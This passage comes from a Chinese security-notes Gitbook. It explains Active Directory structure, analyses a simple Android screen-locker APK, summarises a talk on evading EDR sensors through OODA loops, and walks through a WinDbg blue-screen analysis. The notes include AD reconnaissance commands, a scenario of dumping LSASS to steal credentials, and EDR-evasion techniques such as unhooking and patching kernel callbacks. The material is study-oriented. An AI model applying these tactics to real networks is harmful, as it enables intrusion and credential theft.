管理员只能管理自己所在域，如果俩域中需要互相访问则需要建立信任关系。 d . 域林 由一个或者多个没有形成连续命名空间的域树组成的域树合集。和树的区别就是林中没有连续的命名空间。但是所有的域仍然共享同一表结构、配置和全局目录 三、域控制器（Domain Controller，DC） 域环境核心的服务器，负责响应域中的安全身份认证请求，允许或者拒绝发出请求的主机访问资源，以及对用户进行身份验证、存储用户账户信息并执行安全策略等任务。 该服务器包含一个活动目录数据库，存储着整个域中的账户密码计算机等信息，一般称为“域控”。一个域可以拥有多个域控，每一个单独存储一个活动目录数据库副本（可写的），每一次修改都可以向其他域控进行同步，这样可以保证在一台瘫痪的情况下不影响整个域的正常工作。 活动目录（Active Directory，AD） 安装在域控制器上，为整个域环境提供集中式管理服务的组件。 一、主要存储内容 域环境中各种对象的信息 域 用户 用户组 计算机 组织单位 共享资源 安全策略 ……………… 目录数据存储在域控制器的Ntds.dit文件中。 二、提供的主要功能 计算机集中管理：集中管理所有加入域的服务器和客户端计算机，统一下发组策。 用户集中管理：集中管理域用户、组织通讯录、用户组、对用户进行统一的身份认证，资源授权工作。 资源集中管理：集中管理域中的打印机、文件共享服务等网络资源。 环境集中配置：集中配置域中的计算机的工作环境、统一计算机桌面、统一的网络配置连接、安全配置等等 应用集中管理：对域中的计算机统一推送软件，安全补丁，防病毒软件等，安装网络打印机等。 三、Ntds.dit 在域控制器上保存的一个二进制文件，式活动目录数据库，一般存放在路劲%SystemRoot%\\ntds\\ntds.dit中。 1、包含信息 有关域用户 用户密码的hash 用户组 组成员身份 组策略信息 ………… 使用存储在SYSTEM文件的密钥对上述hash进行加密。在工作组环境中，用户的登录凭据存储在本地的SAM文件中。 四、目录服务和LDAP 1、活动目录 一种目录服务数据库，目录数据库实现的是目录服务，可以帮助用户快速准确的从目录中找到所需信息的服务。 将所有的数据组成一个有层次的树状结构，每个节点作为一个对象，这个对象的属性就是这个对象的所有信息，用户可以根据名称进行查找。 2、LDAP（lightweight directory access protocol） 轻量目录访问协议，用来访问目录数据库的一种协议，活动目录就是利用LDAP名称路径来描述对象在活动空间中的位置的。 如下图是一个经典的组织结构，呈一个完美的树形结构。 目录树：在一个目录数据库中，整个目录中的信息集可以表示为一个目录信息树。树的每一个节点是一个条目。 条目：每一个条目就是一条记录，每一个条目都有自己的唯一标识符DN， 绝对可辨识名称：DN，distinguished name。CN表示通用名，comman name，OU代表组织单位，DC代表域组件 域用户和机器用户 一、域用户 就是域环境中的用户，在域控制器中被创建，所有的信息都保存在活动目录中，域用户账户在域的全局组Domain user中，计算机本地用户位于本地User组中。当计算机加入域之后，全局组Domain user被添加到计算机本地的User组中，所以域用户可以在域中任何一台计算机登录，通过下面的命令 net user /domain 二、机器用户 特殊的一种域用户，查询活动目录时选中Domain Computer组的一台机器账户，查看他的ObjectClass属性，可以发现他是computer类的示例，是user的子类。 在域环境中，本地System用户对应的机器用户，一般就是\"机器名+$\"这种格式。 net group \"Domain Computers\" /domain 所以说进行横向渗透之前需要提权到System用户权限。用管理员权限打开cmd是不行的，必须要拿到system权限。 三、域用户组的分类和权限 在域中将具有相同权限的用户划分一组，这样只需要对用户组添加权限，组里的所有成员就都有了。 1、组用途 用户账号的集合，常见一下两组 通讯组：给通信组发信息时，组内的用户都能收到 安全组：对一个组赋予权限，则组内都是那个权限 2、安全组的权限 根据组的作用范围（在域树或者域林中应用的范围），安全组可以划分为域本地组，通用组和安全组。 a. 域本地组（Domain Local Group） 域本地组作用于本域，主要用于访问同一个域中的资源，除了本组内的用户，还可以包域林内的任何一个域和通用组、全局组的用户，但无法包含其他域中的域本地组。 常见的系统内置的域本地组及其组权限： Administrators：管理员组，改该组的成员可以不受限制地存取计算机/域的资源。不仅是最具有权限的一个组，也是在活动目录和域控制器中默认具有管理员权限的组，是域森林中强大的服务管理组 Remote Desktop Users：远程登录组，处于远程登录组中的用户才有权限使用远程登录服务。 Print Operators：打印机操作员组，位于该组内的成员可以管理网络中的打印机，包括建立、管理和删除网络打印机，并可以在本地登录和关闭域控制器。 Account Operators：账号操作员组，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器，但是，不能更改属于 Administrators 或 Domain Admins 组的账户，也不能修改这些组。在默认情况下，该组中没有成员 Server Operators：服务器操作员组，该组的成员可以管理域服务器，其权限包括建立/管理/删除任意服务器的共享目录、管理网络打印机、备份任何服务器的文件、格式化服务器硬盘、锁定服务器、变更服务器的系统时间、关闭域控制器等。在默认情况下，该组中没有成员。 BackupOperators，备份操作员组，改组的成员可以在域控制器中执行备份和还原操作，并可以在本地登录和关闭域控制器。在默认情况下，该组中没有成员。 如果域林总的多个域的用户想要访问一个域的资源，可以从其他域向这个域的域本地组添加用户、通用组和全局组。 执行命令 Adfind.exe -b dc=hack-my,dc=com -bit -f \"(&(objectClass=group)(grouptype:AND:=4))\" cn -dn 可以查看hack-my.com域中的所有域本地组。 b. 通用组 通过命令，可以查看hack-my.com域内的所有通用组 Adfind.exe -b dc=hack-my,dc=com -bit -f \"(&(objectClass=group)(grouptype:AND:=8))\" cn -dn 无法包含任何一个域中的域本地组，其他的都可以。对应到实践就是通用组一般对域林中所有域的资源都有访问权限，而不需要考虑通用组所在的位置。 两个的常见的系统内置的通用组及其组权限： Enterprise Admins：企业系统管理员组，是域森林根域中的一个组。Enterprise Admins 组在域森林中的每个域内都是 Administrators 组的成员，因此对所有域控制器都有完全访问控制权。 Schema Admins：架构管理员组，是域森林根域中的一个组，可以修改活动目录和域森林的模式。Schema Admins 组是为活动目录和域控制器提供完整权限的域用户组，因此，该组成员的资格是非常重要的。 c. 全局组 介于域本地组和通用组之间的组，可以作用于域林中的所有域。对应到实践就是全局组一般对域林中所有域的资源都有访问权限，而不需要考虑通用组所在的位置。 查询域内的所有全局组： Adfind.exe -b dc=hack-my,dc=com -bit -f \"(&(objectClass=group)(grouptype:AND:=2))\" cn -dn Domain Admins，管理员组，该组的成员在所有加入域的服务器、域控制器和活动目录中均默认拥有完整的管理员权限。因为该组会被添加到自己所在域的 Administrators 组中，因此可以继承 Administrators 组的所有权限。同时，该组默认会被添加到每台域成员计算机的本地 Administrators 组中，这样，Domain Admins 组就获得了域中所有计算机的所有权。如果希望某用户成为域系统管理员，建议将该用户添加到 Domain Admins 组中，而不要直接将该用户添加到 Administrators 组中。 Domain Users，域用户组，该组的成员中是所有的域用户。在默认情况下，任何由我们建立的更户账号都属于 Domain Users 组。因此，如果想让所有的账号都获得某种资源在取权限、可以将该权限指定给域用户组，或者让域用户组属于具有该权限的组。 Domain Computers，域成员主机组，该组的成员是域内所有的域成员主机，任何由我们建立的计算机账号都属于 Domain Computers 组。 Domain Controllers，域控制器组，该组成员包含了域内所有的域控制器。 Domain Guests，域访客用户组，该组内的成员默认为域访客用户，域成员计算机会自动将此组加到本地的 Guests 组中。 Group Policy Creator Owners：此组成员可以修改域的组策略。 DnsUpdateProxy：此组成员允许替其他客户端（如DHCP服务器）执行动态更新的 DNS 客户端。 Read-only Domain Controllers：此组中的成员是域中的只读域控制器 组织单位（Organization Unit，OU） 对用户设置权限时，可以先拉入一个组，然后对这个组赋予权限，再把用户拉进来，这个组一般称之为组织单位。 访问控制 一、Windows访问控制模型（Access Control Model） 主要由访问令牌（Access Token）和安全描述符（Security Descriptor）两部分组成，分别由访问者和被访问者持有。 通过比较两者可以判断访问资源的对象有没有权限。 1、访问令牌 用户登录时，Windows对用户进行身份验证，通过验证就给一个访问令牌，之后的该用户执行的每一个进程都有这个令牌的副本，每当线程或者进程于安全对象交互或者尝试执行需要特权的系统任务的时候，Windows都会使用此访问令牌标识并确定关联的用户。 a. 主要内容 用户账户的SID，Security ID，安全标识 用户所属组的SID 当前登录会话的登录SID 用户或用户所属的用户组持有的特权列表 对象所有者的SID 对象所有者组的SID 用户主安全组的SID 访问令牌的来源 令牌类型，是主令牌还是模拟令牌 限制SID的可选列表 当前模拟等级 ………… 2、 安全描述符 当安全对象被创建时，操作系统会为其创建一个安全描述符，主要由SID和ACL（Access Control List，访问控制列表）组成，ACL又分为DACL和SACL两种。 二、访问控制列表（ACL） 主要作用就是访问权限控制，判断安全主体能不能访问该安全对象；日志记录功能，对成果与否进行日志记录 1、DACL 自主访问控制列表，安全对象的访问控制策略，定义了安全对象的访问控制策略，用于指定允许或者拒绝特定安全主体对该安全对象的访问控制，由一条条的访问控制项ACE条目构成，每条ACE定义了哪些用户或者组对该对象拥有什么控制权。一条ACE归纳为四个方向： 谁对这个安全对象有权限 拥有什么权限 能不能允许权限 能不能继承 2、SACL 系统反问控制列表，安全主体对安全对象的访问行为的审计策略。也是由一条条的ACE组成的，作用和DACL一样。 组策略 组策略是Windows环境下管理账户的一种手段，可以控制用户账户和计算机账户的工作环境。 主要实现了以下功能： 账户策略的配置：如密码长度，复杂程度 脚本的配置： 应用程序的安装与删除：用户登录或计算机启动时，自动为用户安装应用，自动修复应用的错误 文件夹重定向 限制访问可移动存储设备 用户工作环境的配置 其他系统设置等 本地组策略：适用于独立的而且非域环境的计算机。 一、组策略对象 由组策略容器和组策略模板构成 其中，组策略容器存储在活动目录的域分区，组策略模板放在：%SYSTEMROOT%\\SYSVOL\\sysvol\\域名\\Polices 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-05-02 20:20:43 "},"MyArticles/Practice.html":{"url":"MyArticles/Practice.html","title":"Practice","keywords":"","body":"纸上得来终觉浅，绝知此事要躬行。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:39:10 "},"MyArticles/Practice/YouTubePremium.apk.html":{"url":"MyArticles/Practice/YouTubePremium.apk.html","title":"Malware-APK0","keywords":"","body":"概述 这是一个锁机apk 在twitter上看到的 https://twitter.com/malwrhunterteam/status/1624366684092997634 这是推友的描述，甜品级别的 apk图片就存放在res里的二级目录，基本都一样 显示这么一个东西，同时点击操作失效，在重新启动设备之后，可以缓解，没有什么含金量。 具体分析 解压之后内容很简单，签名目录，资源目录和一个dex文件还有AndroidManifest.xml文件 xml文件分析 先查看应用清单（AndroidManifest.xml） 创建顶层窗口 接收系统完成引导后广播 ：开机启动 允许设置应用墙纸 允许读取外部存储 允许写外部存储 读取用户的联系人数据 读取短信权限 获得精确的位置信息 让CPU一直工作不能停。 允许应用程序打开网络套接字。 允许程序安装包 允许常规应用程序与“相机”类型一起使用 该软件虽然没有啥危害，但是要的权限还不少。根据权限来推测可能会存在socket连接，指令接收，发包，收集短信、相册、位置、联系人信息。 清单权限|安卓开发者 (android.com) dex分析 没有lib文件，直接查看dex文件，查看仅有五个有用类。 MainActivity 先看主类，代码及其简单 首先使用ADRTLogCatReader记录软件运行期间所产生的日志，根据其他分析报告发现大多数的锁机软件会使用这个来记录日志，不知道为啥，说是因为方便。 下面就是正常的oncreate方法创建一个窗口，通过startService利用Class.forName隐式的跳转Activity，然后传入活动，并启动intent跳转，所以这里就定位到了另一个类MyService MyService 主要功能集中在这个类中 大体浏览可以发现缓解措施，因为程序有一个按钮，所以可以定位到onClick方法 可以看到这个if判断，没有任何加密，只要密码是他，就删除当前界面，手机恢复正常。 这里设置了窗口的格式，17代表了居中，通过this.windowManager.addView(this.myView, layoutParams);来设置窗口置顶 整个Android的窗口机制是基于一个叫做 WindowManager，这个接口可以添加view到屏幕，也可以从屏幕删除view。它面向的对象一端是屏幕，另一端就是View，通过WindowManager的 addView方法创建View，这样产生出来的View根据 WindowManager.LayoutParams属性不同，效果也就不同了。比如创建 系统顶级窗口，实现悬浮窗口效果WindowManager的方法很简单，基本用到的就三addView，removeView，updateViewLayout 总结 这个玩意他要这么多敏感权限就实现了一个锁屏的功能，可能是谁的作业吧，他甚至还留下了他的tg，看来是小号。通过微步的关联分析看得出来这是一个成熟的锁机样本模板，本样本是基础版本，只有一层密码，而且密码直接硬编码在代码中，虽然需要了很多敏感权限，但是就锁机了。 从代码风格分析，这里的程序应该是一个相关专业的学生或者是朋友间开玩笑的应用样本。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-02-13 16:18:44 "},"MyArticles/Practice/OODA-Loops.html":{"url":"MyArticles/Practice/OODA-Loops.html","title":"edr对抗 - OODA 角度","keywords":"","body":"引发文章： Operators, EDR Sensors, and OODA Loops - @Jackson_T 主旨：作为edr的操作或者后续人员，我们如何做决策；以及如何取得优势，在针对EDR取得的信息的时候。 OODA LOOPS 起源 OODA是观察（Observe）、调整（Orient）、决策（Decide）以及行动（Act）的英文缩写，它是信息战领域的一个概念。 OODA循环理论的基本观点是：武装冲突可以看作是敌对双方互相较量谁能更快更好地完成“观察—调整—决策—行动”的循环程序。双方都要从观察开始，观察自己、观察环境和敌人。基于观察，获取相关的外部信息，根据感知到的外部威胁，及时调整系统，做出应对决策，并采取相应行动。 “调整”步骤在整个OODA循环中最为关键，因为如果敌人对外界威胁判断有误，或者对于周围的环境理解错误，那么必将导致方向调整错误，最终做出错误决策。 包以德认为，敌、我的这一决策循环过程的速度显然有快慢之分。我方的目标应该是，率先完成一个OODA循环，然后迅速采取行动，干扰、延长、打断敌人的OODA循环。 OODA循环真正的秘诀在于“快”，撇开一切，瞬息进入快速观察，快速定位，快速决策，立即行动。在行动过程中，一旦出现新的情况，依然是快速观察，快速定位，快速决策，立即行动。要加快个人、团队或组织的决策速度，可以借鉴OODA循环来分析整个决策过程，发现哪些环节速度过快或过慢，从而有针对性地找到加速该决策循环过程的方法。 上述介绍引用自：OODA循环理论 - 知乎 (zhihu.com) 观察(Observe) 需要收集两类信息： 外部信息：通过感知设备或其他方式从环境中获取的原始数据 内部信息：基于过去经验而形成的知识、共识等 收集到的信息进行过滤、组织从而形成对环境的基础认知。 在网络防护过程中，这个阶段需要通过日志、IDS、防病毒等安全设备收集各种威胁信息，形成对攻击行为和漏洞的观察。 定向(Orient) 定向阶段是对观察信息进行分析、评估,形成对环境和对手的理解,为后续决策做准备。这需要利用过去的经验和现有知识体系,从不同角度分析观察信息,判断事件主要方面的因果关系、意图、影响等。 在网络安全中,这个阶段需要分析攻击行为、判断攻击意图,评估网络资产面临的风险水平,为应对决策做准备。可能需要关联分析和威胁情报,形成对整体威胁形势的理解。 决策(Decide) 在理解环境和对手后,决策者需要制定行动计划,判断在当前条件下最优的行动方案。这需要考虑各种行动选项的成本和收益,然后选择最佳方案。 网络安全决策需要根据威胁情报、资产价值等条件,决定是否需要应对,选择何种防御措施。需要评估应对行动的效果、代价,节省资源并降低业务中断。 行动(Act) 这一阶段是执行已决定的行动计划,将决策转化为具体操作。根据环境变化,行动的执行也可能是渐进的、可调整的。 在网络安全领域,这可能包括实施各类防御措施、攻击对手等。需要监控行动效果,根据环境变化调整应对手段。 来自演讲 总结，记录一些演讲中的内容 四种规避edr的路径 回避 避免直接操作安装了EDR产品的系统【我觉得这不太可能，现在国内公司连员工行为检测都上全了，还会有杀软关注不到的设备？】。许多公司在edr覆盖上存在问题，这一点在可能的情况下可以利用。 说白了就是利用edr的监控盲区。 滥用盲区 有时传感器不会收集或报告某些类型的事件。这可能只是配置问题，也可能是软件实现缺失。 规避常见危险行为，比如说不要直接用VirtualAlloc或者CreateRemoteThread之类的敏感函数。 伪装 核心就是白加黑的操作，利用白色程序掩盖自己的恶意行为。最后我们有监控设备篡改，我将其视为降低行为感知在这四个过程中的任何一个过程中的能力。 决策 我们在这里对所确定的选项进行审议，然后选择一种行动方案。在这个过程中，我们会考虑对我们重要的东西，并找出最能代表这些价值观的做法。 期间内容 报告的中间介绍了《Network Attacks & Exploitation: A Framework》这本书里提到的四个原则。 知识：对攻击对手信息的充分了解。 创新：根据实际情况更新攻击方法和攻击手段。 感知：绘制 AD 域图。通过挖掘内部维基来确定目标也有助于建立意识。 预防：尽量减少不可控行为的影响，可以通过增加冗余和多样化访问节点来实现。 以入侵一个服务器为例 从实战角度解释了ooda循环的对应步骤 一些名词 lsass lsass.exe（Local Security Authority Subsystem Service进程空间中，存有着机器的域、本地用户名和密码等重要信息。如果获取本地高权限，用户便可以访问LSASS进程内存从而导出内部数据，用于横向移动和权限提升。 Observe 有来自 SharpHound 收集的数据，其中包括我们目标域中的计算机、群成员资格、活动会话等。此外，我们还在一个文件中发现了一个公用事业服务账户的凭据。当我们遍历整个环境时，可以发现我们遇到的大多数端点上都安装了 \"Fancy EDR 2000 \"产品，而 LSASS 缺乏保护。 收集了成员社交信息 登录凭证信息 安全防护信息 Orient 根据我们的 BloodHound 数据，有一条通往 \"crownjewels \"服务器的路径。但我们无法使用现有凭证直接验证 crownjewels 服务器。因此，我们可以转到一个跳转框，该跳转框中有一个可以验证目标服务器的账户的活动会话。 另一条路径涉及这个 \"berthascott \"用户。事实证明，我们所拥有的服务账户可以更改该用户的密码，这样我们就可以直接登录 crownjewels 服务器。 根据以往的一些经验，我们得知这款 Fancy EDR 2000 产品其实并不花哨。它擅长检测恶意命令行，但在其他方面并不擅长。因此，如果我们能设法不使用那些有容易签名的命令行的攻击指令，也许会有不错的效果。 最后，如果我们选择凭证转储路线，就可以尝试将我们所了解的 LSASS 转储技术映射到运行环境中。在PPT中，它们被分为由特定命令行或进程调用的技术，以及调用特定 Windows API 函数序列的技术。 Decide 根据上述信息，结合参与的人员队伍拟出了几条路线，最后根据情况选择了如下路线： 使用实用程序服务账户 RDP 进入跳转服务器，然后启动任务管理器并转储 LSASS，这样就能获得服务器账户的凭证或哈希值 Act 按照上述技巧战术进行攻击。 总结 上述过程其实是大多数的攻击中攻击者都会进行的这么一个过程，只不过是平时没有注意到而已，ooda不是什么新鲜的东西，大多数专业的攻击者都会潜移默化的遵循这个过程。 只不过是这个报告把上述过程从一种自发的行为，用ooda去解释了一下，更加的规范化体系化了而已。 显然如果核心是上面这些内容，那么是不会有组织同意他进行报告的，所以下面他又介绍了一个攻击战术： OODA的对抗 OODA 互殴 edr本身也遵循ooda这个流程，而攻击行为也遵循这个行为，既然都遵守了ooda，那么攻击就可以按照 ooda的发明者提出的思想： you have to operate “inside” their OODA loops. 这意味着要在循环的每个过程中理解 EDR 传感器,然后弄清楚如何在适当的地方规避每个过程。我的方法是粗略地从 CIA 三角的角度来看每个过程。 要以比EDR防御循环更快的速度运行你的进攻循环。尽管防御方面进步神速，但攻击者仍然基本上可以通过以更小、更敏捷的组进行运作来获得更大的灵活性。 本质上，你要做的是以一种方式改进操作员循环中的每个过程，这种方式使你能够比防御者做出更好、更快的选择。因此，这可能会为防御者带来模糊性、困惑和偶尔的麻痹，从而降低他们的响应能力。所以这是根据OODA模型“如何取胜”的非常高层概述。 这里主要翻译原文中的内容 观察 这涉及到信息的摄取，包括观察操作系统级别的事件，以及接受指向其不同组件的通信。当传感器决定在系统上执行某个操作时，它也可以观察到该交互过程中发生的事件。 这里列举的几个例子包括操作系统交互（如监控进程创建、文件写入、API 使用等）。还有签名和模型的更新，以及传感器配置和策略的更新。简略的使用上面的入侵例子为例，获得的信息是： 几个内核模式回调，除了能让传感器了解任务管理器进程的创建情况外，还能知道它是否在 LSASS 上创建了进程句柄。 当任务管理器尝试读取 LSASS 的进程内存时，一个 ETW 提供者和一个冗余的内联用户模式钩子。还有另一个过滤器驱动程序回调，让它了解在临时文件夹中创建的转储文件。 在攻击传感器环路的 \"观察 \"过程时，我们有几个选择。首先，我们可以了解从操作系统收集的遥测数据的具体类型。这就是右上角的遥测获取工具（Telemetry Sourcerer tool）的作用，它可以枚举内核模式回调、内联用户模式钩子和 ETW 提供者。值得花点时间了解这些工具分别能捕获什么，这样如果你要篡改传感器，就能以有意义的方式完成。 如今，影响传感器完整性的一种常用方法是通过解除钩子、直接调用系统或使用 Windows API 函数的替代实现来绕过用户模式钩子。比较少见的可能是给注入的传感器 DLL 打补丁，防止它向其服务组件报告遥测数据。 许多传感器依赖内核模式回调来获取进程、线程、对象、文件、注册表等方面的遥测数据。虽然打补丁需要更高的权限，因为你通常会加载一个驱动程序，但从轶事来看，似乎有几种产品并不能立即检测到这一点。 这些方法大多并不新鲜，但对我来说，当我将其纳入 OODA 循环模型时，就会迫使我思考其他后续流程中有哪些是我没有考虑到的。 下面是一个情况模型的简化示例。你可以拥有各种不同类型的对象，如会话、用户、进程和文件。 首先创建的是任务管理器进程，它会从名为 PsSetCreateProcessNotifyRoutine 的内核模式回调中发出一个事件。这可以被规范化为一个事件，并被合成到模型中，表示为创建该进程的 Bertha Scott 用户。 接下来，当我们右键单击 LSASS 进程并将其转储时，任务管理器会在 LSASS 上创建一个进程句柄，并将其规范化为一个事件。我在网上看到过一些使用直接系统调用来避免这种情况的例子，但这通常没有什么意义，因为传感器很可能是从内核模式回调而非用户模式钩子接收相关遥测信息的，所以直接系统调用或解除钩子是没有用的。 第三，当使用句柄读取该进程的内存时，可以将其规范化为一个事件。最后，当创建 lsass.DMP 文件时，可以将其规范化为一个事件。 可以使用多种行为特征来检测这种活动，每种特征都有各自的优缺点。举例来说，如果有任务管理器访问 LSASS 的签名，那么如果可以从另一个进程转储呢？或者，如果有一条规则可以捕捉到不以 SYSTEM 身份运行的进程访问 LSASS，那么我们是否可以直接提升我们的代理，或者以 SYSTEM 身份运行转储命令行？ 我认为，作为操作员，我们有时不知道 EDR 究竟是如何检测到某种技术的，我们正在集思广益，以解决这个问题。但是，如果我们能更多地了解产品正在寻找的具体恶意行为，我们就不会觉得自己是在盲目行事。这样我们就能更快地开发出针对产品和环境的定制绕过方案。 …… 这一阶段作者比较详细的介绍了edr的行为检测以及对应到ooda循环上的步骤，同时实现自己的转储的目的。 定向 当你能够看到事物如何在更细化的层面上运作时，自然就能更容易地开发出保持一定隐蔽性的功能。 作者在这里介绍了如何根据观察到的edr的侦测行为，定制个性化的武器。 决定 在 \"决定 \"流程中，我们可以滥用传感器的配置细节，以便更好地了解它是如何进行检测和预防的。目前已经有几种有用的工具和脚本可用于检测端点上是否存在传感器，但我们还可以进一步解析本地配置，并以此为技术指导。 行动 在 \"行动 \"中，我从中获得的最大益处是可以直接看到传感器打回家的遥测数据。拥有离线遥测后端改变了我的工作流程，因为在一个屏幕上，你可以拥有一个带有传感器的虚拟机，通过交互方式将其暴露在恶意刺激下，而在另一个屏幕上，你可以看到它发送到云端的遥测信息，而不会有实际暴露恶意软件信息的风险。 总结 作者从ooda出发，讲了 原理 实战经过 对抗edr 这仨方向，核心在于对抗edr的ooda方面。ooda本来是人之常情，一般人办事都会遵循这么一个方式，但是ooda将他规范化，体系化了。 作者针对edr的ooda的对抗我尚未完全理解，这里仅仅作为记录，因为平时接触edr很少几乎没有，所以这些技巧战法只停留在理论阶段和道听途说阶段，所以 有很多东西理解并不深刻。以后若能接触到这方面的内容，回来再来补充这篇文章。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 12:28:27 "},"MyArticles/Practice/IRQL蓝屏分析.html":{"url":"MyArticles/Practice/IRQL蓝屏分析.html","title":"蓝屏 - windbg模块解析","keywords":"","body":"电脑两周没关机，准备关机的时候突然蓝屏，得到错误是 IRQL_NOT_LESS_OR_EQUAL，重启后利用everything搜索*.dmp按时间排序找到生成的内存dump文件利用windbg进行错误分析。 权限问题 一开始直接在源目录中进行分析会导致windbg因为权限问题没法载入dmp文件，直接复制到桌面上进行分析即可 在文件，第一个选项，找到open dump file，直接对dmp文件载入分析即可。 dump一般分类为full dump，即发生报错的时候所有的内存快照，体积较大，信息比较全面。另一种就是minidump，只包含了发生异常时的上下堆栈的环境，适合用来提交报错，比较简单明了，但是并不包含当时的内存转储，一般默认是minidump，也可以改成full dump模式。 载入 一般都是显示上面的一些基本信息，主要就是针对蓝屏时候的堆栈和蓝屏的进程进行分析，并尝试发现问题。 信息分析 6: kd> !analyze -v ******************************************************************************* * * * Bugcheck Analysis * * * ******************************************************************************* IRQL_NOT_LESS_OR_EQUAL (a) An attempt was made to access a pageable (or completely invalid) address at an interrupt request level (IRQL) that is too high. This is usually caused by drivers using improper addresses. If a kernel debugger is available get the stack backtrace. Arguments: Arg1: ffffcf07d379a230， memory referenced Arg2: 0000000000000002， IRQL Arg3: 0000000000000001， bitfield : bit 0 : value 0 = read operation， 1 = write operation bit 3 : value 0 = not an execute operation， 1 = execute operation (only on chips which support this level of status) Arg4: fffff8031391807f， address which referenced memory Debugging Details: ------------------ KEY_VALUES_STRING: 1 Key : Analysis.CPU.mSec Value: 1483 Key : Analysis.DebugAnalysisManager Value: Create Key : Analysis.Elapsed.mSec Value: 1541 Key : Analysis.IO.Other.Mb Value: 18 Key : Analysis.IO.Read.Mb Value: 0 Key : Analysis.IO.Write.Mb Value: 31 Key : Analysis.Init.CPU.mSec Value: 530 Key : Analysis.Init.Elapsed.mSec Value: 131146 Key : Analysis.Memory.CommitPeak.Mb Value: 103 Key : Bugcheck.Code.DumpHeader Value: 0xa Key : Bugcheck.Code.Register Value: 0xa Key : Dump.Attributes.AsUlong Value: 1808 Key : Dump.Attributes.DiagDataWrittenToHeader Value: 1 Key : Dump.Attributes.ErrorCode Value: 0 Key : Dump.Attributes.KernelGeneratedTriageDump Value: 1 Key : Dump.Attributes.LastLine Value: Dump completed successfully. Key : Dump.Attributes.ProgressPercentage Value: 0 FILE_IN_CAB: 061023-11093-01.dmp DUMP_FILE_ATTRIBUTES: 0x1808 Kernel Generated Triage Dump BUGCHECK_CODE: a BUGCHECK_P1: ffffcf07d379a230 BUGCHECK_P2: 2 BUGCHECK_P3: 1 BUGCHECK_P4: fffff8031391807f WRITE_ADDRESS: fffff8031431c468: Unable to get MiVisibleState Unable to get NonPagedPoolStart Unable to get NonPagedPoolEnd Unable to get PagedPoolStart Unable to get PagedPoolEnd unable to get nt!MmSpecialPagesInUse ffffcf07d379a230 BLACKBOXBSD: 1 (!blackboxbsd) BLACKBOXNTFS: 1 (!blackboxntfs) BLACKBOXPNP: 1 (!blackboxpnp) BLACKBOXWINLOGON: 1 CUSTOMER_CRASH_COUNT: 1 PROCESS_NAME: msedge.exe TRAP_FRAME: ffffb58592d6f220 -- (.trap 0xffffb58592d6f220) NOTE: The trap frame does not contain all registers. Some register values may be zeroed or incorrect. rax=0000000000000000 rbx=0000000000000000 rcx=ffffcf07d379a230 rdx=0000000000000000 rsi=0000000000000000 rdi=0000000000000000 rip=fffff8031391807f rsp=ffffb58592d6f3b0 rbp=ffffb58592d6f749 r8=0000000000000000 r9=ffffb58592d6f7d8 r10=0000000000000000 r11=0000000000000000 r12=0000000000000000 r13=0000000000000000 r14=0000000000000000 r15=0000000000000000 iopl=0 nv up ei pl zr na po nc nt!KiAcquireKobjectLockSafe+0xf: fffff803`1391807f f00fba2907 lock bts dword ptr [rcx]，7 ds:ffffcf07`d379a230=00060000 Resetting default scope STACK_TEXT: ffffb585`92d6f0d8 fffff803`13a417a9 : 00000000`0000000a ffffcf07`d379a230 00000000`00000002 00000000`00000001 : nt!KeBugCheckEx ffffb585`92d6f0e0 fffff803`13a3ce34 : 00000000`00000001 ffffb585`92d6f7d0 00000000`00000000 00000000`00000001 : nt!KiBugCheckDispatch+0x69 ffffb585`92d6f220 fffff803`1391807f : 00000000`00000000 fffff803`1383d78a 00000000`00000010 00000000`00050282 : nt!KiPageFault+0x474 ffffb585`92d6f3b0 fffff803`1383d7eb : ffff910c`f1ded080 ffffcf07`d379a230 00000000`00000000 00000000`00000000 : nt!KiAcquireKobjectLockSafe+0xf ffffb585`92d6f3e0 fffff803`13bb7df2 : ffff910c`00000001 ffffb585`92d6f749 00000000`00000000 ffffb585`92d6f7d0 : nt!KeSetEvent+0x6b ffffb585`92d6f470 fffff803`13938673 : 00000000`00000000 00000000`00000001 ffff910c`f1ded080 ffffcf08`3658b750 : nt!PsDispatchIumService+0x96e ffffb585`92d6f6e0 fffff803`13f589d7 : 00000001`400000d0 ffff910d`135440c0 ffff910d`13544518 00000000`0000000b : nt!VslpEnterIumSecureMode+0x287 ffffb585`92d6f7b0 fffff803`13b893b1 : 00000000`0000000b 00000000`000000a0 00000000`00000000 ffffcf08`2c7978b8 : nt!VslRundownSecureProcess+0x47 ffffb585`92d6f860 fffff803`13eb4315 : ffffcf08`2c7978b0 ffffcf08`2c797860 ffffcf08`2c7978a0 fffff803`13cef7c8 : nt!KeRundownSecureProcess+0x15 ffffb585`92d6f890 fffff803`13cf15ca : ffff910d`135440c0 ffffcf08`18720060 ffff910d`135440c0 00000000`00000000 : nt!PspRundownSingleProcess+0x224e41 ffffb585`92d6f920 fffff803`13d7c402 : 00000000`00000000 ffff910d`13544001 ffff910c`f1ded0f4 00000018`a0587000 : nt!PspExitThread+0x64e ffffb585`92d6fa20 fffff803`13a40ee8 : ffff910c`0000169c ffff910c`f1ded080 ffff910d`135440c0 ffff910d`135440c0 : nt!NtTerminateProcess+0xf2 ffffb585`92d6faa0 00007ffe`d968f1d4 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x28 00000018`a0dffb78 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : 0x00007ffe`d968f1d4 SYMBOL_NAME: nt!KiAcquireKobjectLockSafe+f MODULE_NAME: nt IMAGE_NAME: ntkrnlmp.exe IMAGE_VERSION: 10.0.22621.1778 STACK_COMMAND: .cxr; .ecxr ; kb BUCKET_ID_FUNC_OFFSET: f FAILURE_BUCKET_ID: AV_nt!KiAcquireKobjectLockSafe OSPLATFORM_TYPE: x64 OSNAME: Windows 10 FAILURE_ID_HASH: {87978629-0a82-b7ad-caa7-eb2c5ba684a3} Followup: MachineOwner --------- 开头 第一行可以看到报错的错误类型： 后面的(a)代表这个错误的错误代码是0x0000000A，后面是对这个错误的解析 尝试在中断请求级别(IRQL)访问一个可分页(或完全无效)的地址，这个等级太高了。这通常是由于驱动程序访问了错误的地址造成的。 